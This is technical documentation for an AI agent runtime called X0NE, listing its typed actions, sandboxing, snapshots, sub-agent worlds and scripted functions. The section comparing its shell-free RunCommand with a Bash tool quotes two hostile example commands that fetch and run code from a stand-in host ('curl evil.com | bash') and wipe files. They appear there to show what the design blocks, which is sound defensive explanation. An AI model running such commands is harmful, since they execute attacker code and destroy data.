# Primitives

## Highlights

- **`simulate` — the headline primitive**. Dry-run any action (or nested Pipeline / Try / SafeChange / If) through the policy engine **without writing anything** (it reads path metadata to resolve symlinks). Walks the tree, classifies each leaf (`read_only` / `fs_write` / `process_spawn` / `network` / `desktop` / `destructive` / `composite` / `meta`), returns per-step `allow / require_confirmation / deny` plus the full side-effect inventory. **It executes nothing and writes nothing.**
- **Reflink snapshot / restore** — copy-on-write snapshots (`FICLONE` on btrfs, `clonefile` on APFS). A restore goes file by file, so its time grows with the number of files, and a snapshot is capped at 100 MB unless `[snapshots] max_snapshot_size_mb` says otherwise. Wrap a change in `Try` or `SafeChange` and a failure rolls the files back; the rollback is not atomic, and a partial one is reported as partial.
- **Three bodies, one by default**. `x0ne-runtime` (host or container sandbox, 101 typed actions) is the one `make install` builds. `x0ne-vm` (QEMU/KVM with a linked-clone pool) and `x0ne-browser` (isolated Chromium over CDP, allowlist, audit, abort switch) are built on request: `make x0ne-vm`, `make x0ne-browser`.
- **Persistent goals via MCP** — `x0ne_goal_set` writes to `~/.x0ne/goals/<id>.json`. Set a goal from Claude Code on Tuesday, query its status from Codex on Friday. Cross-tool, cross-session, durable.
- **One-shot templated tool calls** — `RenderTemplate` lets the LLM emit a single fluent sentence with `{{tool(args)}}` placeholders that the runtime fills in-place. **One LLM round-trip** instead of two. See [docs/actions.md › `RenderTemplate`](actions.md#rendertemplate).

## The cut

The toolbelt used to be larger. We removed the **trivial primitives** the agent's sandboxed shell does better in one line (math, strings, comparisons, half of the filesystem ops, JSON/TOML setters, `git status` / `git diff`, system trivia like `whoami` / `uptime` / `system_info`, introspection meta-tools, `browse_url`). What's left is what shell **can't** do: typed safety, snapshots, simulate, composition, audit.

**101 typed runtime actions (`ListActions` gives the current list; the tables below show the main ones), 22 `x0ne_*` tools added by the MCP gateway, and the scripted-function family (DefineFunction / CallFunction / ListFunctions / DeleteFunction — agent-extensible Tier 1, Rhai today / WASM next). Every primitive takes typed input, returns typed output, goes through the policy engine.**

## Filesystem

| Action | Description | Mutable |
|--------|-------------|---------|
| `ReadFile` | Read file with optional offset/limit | No |
| `WriteFile` | Create or overwrite a file | Yes |
| `EditFile` | Multiple find-and-replace edits | Yes |
| `ApplyPatch` | Apply unified diff | Yes |
| `MoveToTrash` | Move to OS trash | Yes |

## Search

| Action | Description | Mutable |
|--------|-------------|---------|
| `SearchCode` | Regex search inside file contents, single (`pattern`) or multi-needle OR (`patterns: [...]`, compiled into one `RegexSet`, single walk) | No |

```json
// Multi-pattern: 3 needles, ONE round-trip, ONE walk
{"type": "SearchCode", "root": "./src", "patterns": ["TODO", "FIXME", "XXX"], "file_glob": "*.rs"}

// Multi-glob: find all source/config/doc files in one call
```

`patterns` (array) takes precedence over `pattern` (string). Same trick as `ripgrep -e p1 -e p2 -e p3`, saves 5–10× round-trips when an LLM is hunting for multiple things at once. The output's `pattern` field is rendered as `(p1|p2|p3)` for readability.

## Network

| Action | Description | Mutable |
|--------|-------------|---------|
| `FetchUrl` | HTTP GET | No |
| `HttpRequest` | Full HTTP (GET/POST/PUT/PATCH/DELETE/HEAD) | Yes |

## Git

| Action | Description | Mutable |
|--------|-------------|---------|

## Execution

| Action | Description | Mutable |
|--------|-------------|---------|
| `RunCommand` | Run a whitelisted command | Yes |
| `RunInSandbox` | Run in ephemeral Podman container (image allowlist, resource caps, file collection) | Yes |
| `RunContainerGroup` | Run N Podman containers in parallel (semaphore-limited concurrency) | Yes |
| `Pipeline` | Sequence of actions with stop-on-error and optional snapshot | Yes |
| `RenderTemplate` | **One-shot template substitution** — LLM emits `"Il y a {{str_count(\"strawberry\",\"r\")}} r"`, runtime calls the tool, splices `3` back in. **Saves a full LLM round-trip** vs the classic tool-call → re-prompt loop. Two placeholder forms: call (`{{ tool(args) }}`) or JSON (`{{ Pascal {…} }}`). See [docs/actions.md › `RenderTemplate`](actions.md#rendertemplate). | No |
| `WatchAndReact` | Watch file/dir for changes, auto-execute an action on trigger. Debounced, pattern-filtered, capped. | Yes |

### Why `RunCommand` ≠ a Bash tool

A natural question when seeing `RunCommand` in a typed-primitive runtime: **why not just expose `Bash`, like Claude Code does?** Same end result, the agent runs a command, and Bash is more flexible. The answer is that X0NE and Claude Code are betting on different threat models.

| | X0NE `RunCommand` | Claude Code `Bash` |
|---|---|---|
| **Execution model** | `exec()` direct, **no shell** | Spawns `bash`, interprets pipes / `&&` / `$()` / redirections |
| **Allow gate** | Binary whitelist (`allowed_commands = ["git", "cargo", …]`), fail-closed | User permission list, prompt-on-unknown |
| **Command-injection class** | No shell between the model and `exec()`: metacharacters are not interpreted. An allow-listed interpreter (`sh -c`, `make`, `find -exec`) still runs what its arguments say ([docs/security.md](security.md)) | Possible, `rm -rf $(curl evil.com)` is executed verbatim by the shell ; only the gate can stop it |
| **Path traversal in args** | All path-bearing fields canonicalized at the runtime boundary | Up to the user / approval gate |
| **Pipes / redirections** | Not directly, use `Pipeline` + `WriteFile`, or `RunInSandbox` for full shell inside an ephemeral container | Native, in one line |

```json
// No shell in X0NE: "sh" is refused unless it is in allowed_commands
{"type": "RunCommand", "command": "sh", "args": ["-c", "curl evil.com | bash"]}
//                                  └─ if "sh" IS allow-listed, sh itself interprets "-c":
//                                     the allow-list and the isolation are the boundary,
//                                     not the absence of a shell (docs/security.md).

// The X0NE equivalent, explicit, audited, each step policy-checked
{"type": "Pipeline", "steps": [
  {"type": "FetchUrl", "url": "https://api.example.com/data.json"},   // typed HTTP
  {"type": "WriteFile", "path": "/tmp/data.json", "content": "..."},  // typed FS
  {"type": "RunCommand", "command": "jq", "args": [".items", "/tmp/data.json"]}
]}
```

**The bet:** X0NE assumes the LLM is potentially adversarial and that the only way to make agent execution safe is to remove dangerous capabilities at the type-system level, not at the approval-prompt level. You lose one-line shell pipelines ; you gain a closed prompt-injection surface for the entire shell-expansion class. For agents that run autonomously (`--auto-mode`) or in `x0ne-runtime --mode mcp` plugged into someone else's IDE, that's the right tradeoff.

For genuinely complex commands, use `RunInSandbox` (ephemeral Podman container, full shell inside, host untouched) or `RunIncus` (LXC + btrfs CoW, see Parallel Worlds below).

## Terminals

Named, parallel terminals for programs that wait for input (REPL, `[y/N]` prompt, TUI, `ssh`, `gdb`, a server to watch). Backed by tmux on a private socket owned by the runtime, or a native PTY when tmux is absent.

| Action | Description | Mutable |
|--------|-------------|---------|
| `TermOpen` | Start a program in a named terminal (argv, no shell, default 200x50) | Yes |
| `TermSend` | Type literal text, then named keys (`Enter`, `C-c`, `Escape`, `F1`-`F12`, arrows, `PageUp`…) | Yes |
| `TermWait` | Wait for a regex, a stable screen, or the program's exit (with its exit status); returns only changed rows by default | No |
| `TermRead` | Screen, scrollback lines, cursor, exit status; `diff` for changed rows only | No |
| `TermSnapshot` | Whole scrollback, plain or ANSI | No |
| `TermResize` / `TermList` / `TermClose` | Resize, list, close | Yes / No / Yes |

- **Policy.** `TermOpen` meets the same gates as `RunCommand` (allowlist, cwd, isolation). `TermOpen`, `TermSend` and `TermResize` are `ProcessSpawn`: off by default, refused in `readonly`, asked in `confirm`. On the host, each `TermSend` is approved one at a time (no per-terminal grant, never dispensed by trust roots): a terminal holding a shell runs whatever is typed. Under `--isolation container` the allowlist filters `TermOpen` too: the container is a second wall, not a replacement for the policy.
- **Caps** (`[term]`): `max_sessions` (8), `max_read_bytes` (65536), `max_wait_ms` (300000).
- **Audit.** Every terminal is recorded as asciicast v2 (`asciinema play`), and every open, send, resize and close is appended to `audit.jsonl`, under `~/.x0ne/term/<run>/`. All terminals are killed when the runtime exits, including on SIGKILL.

## System

| Action | Description | Mutable |
|--------|-------------|---------|
| `FileInfo` | File metadata | No |
| `Checksum` | SHA-256 / MD5 / SHA-1 | No |
| `ListProcesses` | Running processes | No |
| `PortCheck` | TCP port check with latency | No |
| `DnsLookup` | Hostname → IP | No |

## Data

| Action | Description | Mutable |
|--------|-------------|---------|
| `RandomBytes` | Cryptographic random bytes (hex/base64) | No |

## Memory

Namespaced key-value store persisted to `~/.x0ne/memory/`:

| Action | Description | Mutable |
|--------|-------------|---------|
| `Remember` | Store a key-value pair | Yes |
| `Recall` | Retrieve a value by key | No |
| `Forget` | Delete a key | Yes |
| `ListMemory` | List all keys in a namespace | No |

## Validation

| Action | Description | Mutable |
|--------|-------------|---------|
| `Validate` | Type/schema/range checks on values | No |
| `Diff` | Unified diff between strings or files | No |

## Human interaction

| Action | Description |
|--------|-------------|
| `AskHuman` | Prompt operator for input |
| `Confirm` | Yes/no confirmation gate |
| `AskMultipleChoice` | Multiple-choice selection |

## Snapshots

| Action | Description | Mutable |
|--------|-------------|---------|
| `CreateSnapshot` | Backup specified paths | Yes |
| `RestoreSnapshot` | Restore snapshot | Yes |
| `ListSnapshots` | List snapshots | No |
| `DeleteSnapshot` | Delete snapshot | Yes |

## Handles & Events

| Action | Description |
|--------|-------------|
| `Subscribe` | Watch file changes, process exit, port open |
| `CheckHandle` | Drain buffered events |
| `StopHandle` | Cancel handle |
| `ListHandles` | List active handles |
| `SendInput` | Write to stdin of a running streaming process (interactive CLI/REPL) |

## Desktop (requires `desktop.enabled = true`, Sway/Wayland)

`Screenshot` `GetWindowTree` `GetFocusedWindow` `MoveMouse` `Click` `DoubleClick` `Scroll` `TypeText` `PressKey` `PressKeyCombination` `FocusWindow` `SendNotification` `GetClipboard` `SetClipboard`

Requires external Wayland tools:
```bash
sudo apt install grim wlrctl wtype wl-clipboard libnotify-bin
```
`[desktop] allowed_apps` confines every input gesture, not only `FocusWindow`: the target window's `app_id` is re-read before each event and must be listed; unknown windows, clicks without coordinates, compositor keys and `GetClipboard` are refused. See [docs/desktop.md](desktop.md) for full setup, configuration and the limits.

## Meta

`ListActions` `DescribeAction` `PolicyCheck` `ReadLogs`

## Artifact, browser-reachable web artifacts

When an agent writes HTML/CSS/JS that a human wants to open, the orchestrator embeds a **loopback reverse-proxy** on `127.0.0.1:7800` to make the artifact reachable at `http://localhost:7800/a/<artifact_id>/`, without opening any port on the network.

| Primitive | Where | Description |
|---|---|---|
| `ArtifactCreate` | x0ne-runtime | Allocate an artifact directory, return `{ artifact_id, root_path, url }` |
| `ArtifactExpose` | **orchestrator** (host) | Register with the local proxy, return the loopback URL |
| `ArtifactUnexpose` | **orchestrator** (host) | Remove an artifact (or all) from the local proxy |
| `ArtifactList` `ArtifactSave` `ArtifactStop` `ArtifactDestroy` `ArtifactServe` | x0ne-runtime | Lifecycle |

```json
// Agent chain: create → write → expose
{"type": "Pipeline", "steps": [
  {"type": "ArtifactCreate", "name": "eth-ticker"},
  {"type": "WriteFile", "path": "{root_path}/index.html", "content": "<!DOCTYPE html>…"},
  {"type": "ArtifactExpose", "artifact_id": "{artifact_id}"}
]}
```

`ArtifactExpose` executes on the host (never inside the sandbox, same pattern as `RunIncus`) and returns a URL the user's browser can actually open. Files are pulled out of the sandbox on-demand via `incus file pull`; no files are copied to the host, no Incus device is created, and the port is `127.0.0.1` only. When `x0ne` exits, the port dies with it. See [x0ne-orchestrator/README.md § Artifact](../x0ne-orchestrator/README.md#artifact--browser-reachable-web-artifacts) for details.

## Composite Primitives

Define reusable, parameterized macros from existing primitives. Stored on disk, discoverable via `ListActions`/`DescribeAction`, and executed like native actions.

| Action | Description | Mutable |
|--------|-------------|---------|
| `DefinePrimitive` | Define a composite from a pipeline of existing actions | Yes |
| `CallPrimitive` | Call a defined composite with arguments | Yes |
| `ListCustomPrimitives` | List all user-defined composites | No |
| `DeletePrimitive` | Delete a composite by name | Yes |

Example, define a health check macro:
```json
{"type": "DefinePrimitive", "name": "HealthCheck",
  "params": {
    "url": {"type": "string", "required": true},
    "log_path": {"type": "string", "required": true}
  },
  "steps": [
    {"type": "HttpRequest", "url": "{url}", "method": "HEAD"},
    {"type": "ReadLogs", "path": "{log_path}", "lines": 50}
  ]}
```
Call it: `{"type": "CallPrimitive", "name": "HealthCheck", "args": {"url": "https://api.example.com", "log_path": "/var/log/app.log"}}`

**Security:** No recursion, no self-reference, max depth 3, every step passes through the policy engine. Persisted in `~/.config/x0ne/primitives/`.

## Try / Assert (core primitives)

Transactional execution with automatic snapshot and rollback:

```json
{
  "type": "Try",
  "label": "refactor auth",
  "rollback_on_fail": true,
  "actions": [
    {"type": "WriteFile", "path": "src/auth.rs", "content": "..."},
    {"type": "RunCommand", "command": "cargo", "args": ["check"]}
  ]
}
```
If `cargo check` fails → the file is **automatically restored** from snapshot.

```json
{"type": "Assert", "check": "file_exists", "path": "/tmp/output.txt"}
{"type": "Assert", "check": "eq", "actual": 42, "expected": 42}
```

9 assertion checks: `file_exists`, `file_contains`, `port_open`, `command_succeeds`, `eq`, `gt`, `lt`, `not_empty`, `env_set`.

## Sysaicalls (orchestrator-side)

These meta-actions run in the **orchestrator**, not in x0ne-runtime. They are the control-flow primitives that enable multi-agent coordination:

| Action | Description |
|--------|-------------|
| `Plan` | Label and execute a multi-step plan with progress tracking. |
| `SpawnWorld` | Spawn a sub-agent with its own conversation, LLM context, and x0ne-runtime bridge. |
| `WaitAgent` | Wait for a sub-agent to finish and collect its result + token usage. |
| `ListAgents` | List active sub-agents and their status (running/completed/failed). |
| `BroadcastAgents` | Send a message to all running sub-agents. |
| `Reflect` | Self-evaluation over the conversation context. |

### Orchestrator-First Dispatch

The orchestrator acts as a **universal action router**. When a `Pipeline` contains any sysaicall (SpawnWorld, WaitAgent, etc.), the orchestrator executes the entire Pipeline locally, routing each step to either local handling or x0ne-runtime's bridge. Pure-system Pipelines still forward to x0ne-runtime directly (zero overhead).

```
Pipeline { SpawnWorld, ReadFile, WaitAgent }
    │
    ├─ step 1: SpawnWorld → orchestrator (tokio::spawn + new bridge)
    ├─ step 2: ReadFile   → x0ne-runtime bridge
    └─ step 3: WaitAgent  → orchestrator (await oneshot)
```

This enables the LLM to compose sysaicalls with system actions in a single Pipeline, the key unlock for multi-agent workflows.

## Parallel Worlds

> **The LLM thinks in branches, not sequences.**

Three mechanisms run work in parallel or in isolation. They are distinct actions with distinct contracts, and they combine.

### `SpawnAgent`, inline sub-agent on the parent's runtime

Same container, same filesystem, same process tree as the parent. Runs **synchronously** and returns the sub-agent's final response directly, no `WaitAgent`. For focused delegation where the child must see and mutate the state the parent is working on.

### `SpawnWorld`, detached sub-agent with its own runtime

Each world opens its **own** `x0ne-runtime` (a fresh subprocess in stdio mode, a fresh container in sandbox mode), runs on the canonical driver with a sanitised config, and holds its own approval authority: a parent that answered "Always" hands the world nothing, and a grant inside one world never authorises another. `SpawnWorld` returns a handle immediately; results are collected via `WaitAgent`.

```json
{"type": "Pipeline", "steps": [
  {"type": "SpawnWorld", "id": "ui",      "task": "Design a TUI dashboard for BTC price"},
  {"type": "SpawnWorld", "id": "api",     "task": "Implement CoinGecko API client in Rust"},
  {"type": "SpawnWorld", "id": "tests",   "task": "Write integration tests for the ticker"},
  {"type": "WaitAgent",  "id": "ui",      "timeout_secs": 120},
  {"type": "WaitAgent",  "id": "api",     "timeout_secs": 120},
  {"type": "WaitAgent",  "id": "tests",   "timeout_secs": 120}
]}
```

From the prompt, `/spawn N <prompt>` starts N worlds on the same path: one `SpawnWorld` action per world, through the session's policy, confirmation gate and child cap, exactly as if the model had emitted it. `/spawn` without a prompt is refused with a usage line.

In the CLI, each world works in its own directory, `.x0ne-worlds/<id>` under the directory x0ne was started in: a detached `git worktree` when that directory is the top of a repository with a commit, otherwise a copy (reflink when the filesystem allows) with a baseline commit. Its runtime starts there, and its task names that directory. A world that cannot get its own directory does not start. In `bridge.mode = "http"` worlds keep the old shared behaviour, and `/worlds` says "(shared, no isolation)".

Budget: with a session cap (`/budget`, `cost.budget_usd_limit`), `/spawn N` gives each world an equal share of what is left, and a model-emitted `SpawnWorld` reserves a quarter of it (or its own `budget_usd`, clamped). Reservations plus spend never pass the cap; a world returns what it did not spend. `cost.world_max_tokens` (or `max_tokens` on the action) caps the tokens one world may move.

- `/worlds`: one row per world, as its task reported it: status (`running`, `ok`, `failed` and why), measured cost (`unknown` when the model has no configured rate), budget, tokens, actions, time, directory.
- `/worlds watch`: the live view (also the TUI Worlds pane).
- `/worlds diff [n]`: a diffstat per world, or the full diff of world `n`.
- `/worlds pick <n>`: applies world `n`'s diff to the starting directory, checked first with `git apply --check`.
- `/worlds drop`: removes the directories of finished worlds (worktrees through `git worktree remove`).
- `/worlds-reset`: clears the display registry.

**Safety boundaries:**
- Sub-agents and worlds **cannot spawn further agents** (prevents recursive agent soup)
- Each sub-agent has its own action budget (`X0NE_SERVE_SUB_AGENT_MAX_ACTIONS`, default: 10)
- A session cap bounds children and worlds together (`X0NE_SERVE_MAX_AGENTS_PER_SESSION` in serve mode, default 4); `/spawn` clamps to it, and to 4 when the CLI session sets none
- Interrupt propagation: Ctrl+C stops all Pipeline steps

### `RunIncus` / `RunIncusGroup`, ephemeral containers

When `RunIncus` / `RunIncusGroup` are enabled (requires an Incus remote), agents can **fork N isolated containers simultaneously**, each exploring a different approach, then pick the winner in a single round-trip. `RunInSandbox` and `RunContainerGroup` do the same with rootless Podman (OCI, Linux + macOS), without the btrfs snapshot machinery.

```
Sequential (slow):   try A → fail → try B → fail → try C → ok   (3 round-trips)
Parallel   (fast):   RunIncusGroup [A, B, C] → pick winner       (1 round-trip)
```

| Primitive | What it does |
|-----------|-------------|
| `RunIncus` | Single ephemeral LXC container, inject files, run, collect output, auto-delete |
| `RunIncusGroup` | N containers in parallel, same btrfs snapshot, different commands |
| `base_snapshot` | CoW clone of one frozen state, so all worlds start from it |
| `snapshot_on_exit` | Save container state as a rollback point before a risky operation |
| `RunInSandbox` | Single ephemeral Podman container, full shell inside, host untouched |
| `RunContainerGroup` | N Podman containers in parallel, semaphore-limited |

Container start times depend on the Incus server and its storage pool; they were not measured for this release.

### Combining them

A parent agent can spawn worlds that each use Podman or Incus containers internally:

```
Parent LLM
├─ SpawnWorld "frontend"  → world uses RunInSandbox (Podman) to test in Alpine
├─ SpawnWorld "backend"   → world uses RunIncus to test in Ubuntu (full system)
├─ SpawnWorld "benchmarks"→ world uses RunContainerGroup [4 Podman variants]
├─ SpawnWorld "variants"  → world uses RunIncusGroup [4 Incus variants, btrfs CoW]
└─ WaitAgent all          → collect results, pick winner
```

### Sandbox mode (`make run-incus-runtime`)

Even when x0ne-runtime runs inside a sandbox container, Parallel Worlds still work. The orchestrator maintains a **secondary host-side bridge**, a local x0ne-runtime instance with access to the `incus` CLI. When RunIncus/RunIncusGroup are detected, they are routed to this host-side bridge instead of the sandbox:

```
Orchestrator (host)
├── Primary bridge ──→ sandbox container (ReadFile, WriteFile, RunCommand…)
│                        ↑ winning solution applied here
└── Incus bridge ────→ local x0ne-runtime → incus launch → ephemeral containers
                         (RunIncus, RunIncusGroup)
```

This means `make run-incus-runtime` gives you **full isolation** (agent actions in the sandbox) AND **parallel worlds** (Incus containers on the remote), no nested containers needed.

### Time Travel, snapshot & rollback

Incus containers on btrfs are **time machines**. Every container state can be frozen and cloned from a Copy-on-Write snapshot:

```
Agent explores risky refactor
  ├─ snapshot_before: "pre-refactor"     ← frozen state
  ├─ writes 12 files, runs tests         ← fails
  ├─ RestoreSnapshot "pre-refactor"      ← rollback
  └─ tries a different approach          ← clean slate, same starting point
```

| Capability | How |
|------------|-----|
| **Checkpoint before risk** | `base_snapshot` / `snapshot_before` on any `RunIncus` or `Pipeline` |
| **Rollback** | `RestoreSnapshot`, file by file, reflink on btrfs |
| **Branch & compare** | `RunIncusGroup` forks N CoW clones from the same snapshot, each explores a different strategy, agent picks the winner |
| **Survive catastrophic failure** | Container deleted on exit (`--ephemeral`), host is never touched |

The LLM doesn't need to be careful, it can explore aggressively, knowing that any checkpoint is a free undo. This is the key difference from bare-metal agents: **mistakes are free**.

→ Full Incus setup and architecture: [Parallel Worlds & Snapshot Architecture](architecture.md#parallel-worlds--snapshot-architecture)

## Multimodal

X0NE is not text-only, agents can **see**, **listen**, and **delegate to specialized models**.

### Vision pipeline

When the agent takes a `Screenshot`, the image is injected directly into the conversation as a base64-encoded attachment. All three backends handle it natively:

| Backend | Format |
|---------|--------|
| **Anthropic** (Claude) | Multi-part content blocks: `[{type:"text"}, {type:"image", source:{type:"base64", ...}}]` |
| **Ollama** (llava, bakllava) | `images: [base64...]` array on the user message |
| **OpenAI-compat** (GPT-4o, etc.) | `content: [{type:"text"}, {type:"image_url", image_url:{url:"data:..."}}]` |

The LLM literally sees the screenshot, no OCR, no description intermediary.

### Multi-model pipeline

Different models excel at different tasks. Chain them in a single `Pipeline`:

```json
{
  "type": "Pipeline",
  "steps": [
    {"type": "Screenshot"},
    {"type": "OllamaChat", "endpoint": "http://localhost:11434", "model": "llava",
     "messages": [{"role": "user", "content": "Describe this UI", "images": ["<base64>"]}]},
    {"type": "LlmCall", "endpoint": "http://localhost:11434", "model": "codellama",
     "prompt": "Fix the CSS issue described above"}
  ]
}
```

`OllamaChat` supports full multi-turn conversations with optional per-message image attachments, ideal for vision models that need follow-up questions.

### Document extraction

`DocumentExtract` handles PDF → text (pdftotext), video → transcription (whisper), image → OCR (tesseract), and can optionally convert the output to a JSONL training dataset via an LLM.

## Agent-extensible primitives — scripted functions

The agent doesn't only consume primitives. It can **mint its own**. Every session can permanently grow X0NE's standard library with small typed callable functions.

```jsonc
// 1. Agent emits this once. Validates, persists to ~/.x0ne/functions/registry.json.
{
  "type": "DefineFunction",
  "name": "slugify",
  "description": "lowercase + replace whitespace with dashes",
  "source": "fn run(s) { let t = s.to_lower(); t.replace(\" \", \"-\"); t }",
  "params": ["s"],
  "returns": "string"
}

// 2. From now on (this session, the next, every other agent), call as a primitive:
{ "type": "CallFunction", "name": "slugify", "args": ["Hello X0NE World"] }
//          → "hello-x0ne-world"   (returned in ~500µs)
```

**Why this is different from a Python service**

| | Python "tool" service | **Scripted function (Rhai)** |
|---|---|---|
| Cold start | 100–1000 ms | **0.5 ms** |
| Footprint | 50–500 MB process | **<1 MB engine, 0 KB per function** |
| Sandboxing | container-level | **bytecode + capability** (no FS / net / clock unless host registers them) |
| Deterministic | ❌ | **✅** (identical input → identical output, no side channels) |
| Persistence | container lifetime | **`~/.x0ne/functions/<name>` keyed by SHA-256 of source** |
| MCP exposure | manual wrap | **automatic** (`x0ne_call_<name>` in `tools/list`) |

**Tier 1 (`tier: "rhai"`, default)** — what's shipping today. Pure functions, op-budget capped (5M ops ≈ 100ms of arithmetic), recursion capped at 64, 2 s per call. One value holds at most 1 MiB of strings, 16,384 array items (or BLOB bytes) and 4,096 map entries, nested content included; map keys are not counted. A call holds at most 256 variables. `print` and `debug` go to stderr, prefixed `x0ne-runtime: rhai`, 16 KiB per call. The script must define `fn run(<params>)` at the top level. JSON ↔ Rhai conversion is total: strings, numbers, booleans, arrays, objects all round-trip; `null` ↔ `()` (Unit).

**Tier 2 (`tier: "wasm"`)** — reserved. Same shape, Wasmtime engine, agent ships a pre-compiled `.wasm` module for compute-heavy work. Lands in a follow-up commit.

**MCP gateway promotion**

Once a function is defined, the orchestrator's MCP gateway exposes it as `x0ne_call_<name>` in `tools/list` so other agents (Claude Code, Codex, sibling X0NE sessions, anything MCP-aware) call it as if it were a built-in. Agent A invents `levenshtein_ratio`, agent B uses it. Compounding stdlib.

**Rhai gotchas worth knowing** (the system prompt nudges the LLM about these — pinned by tests in `x0ne-runtime/src/scripted.rs`):

- `String.replace(...)` mutates in place and returns Unit. Pattern: `let t = s.to_lower(); t.replace(" ", "-"); t`.
- `arr.len`, `s.len` are properties (no parentheses).
- No `eval`, no `import`, no `Engine::file*` — pure function only by design.

**Control-plane MCP tools** (`define_function` / `call_function` / `list_functions` / `delete_function`) are enabled by default since the engine is its own sandbox. Disable in `[actions]` if you want a strict whitelist runtime.

```bash
x0ne_call_function name=slugify args='["My Title"]'
# {"name":"slugify","value":"my-title","duration_us":540}

x0ne_list_functions
# {"count":3,"functions":[{"name":"slugify",…},{"name":"levenshtein_ratio",…},…]}
```

10 end-to-end scenarios in `x0ne-runtime/tests/scenarios/scripted_functions.json` and 13 unit tests in `src/scripted.rs` cover round-tripping, op-cap enforcement, and registry persistence.
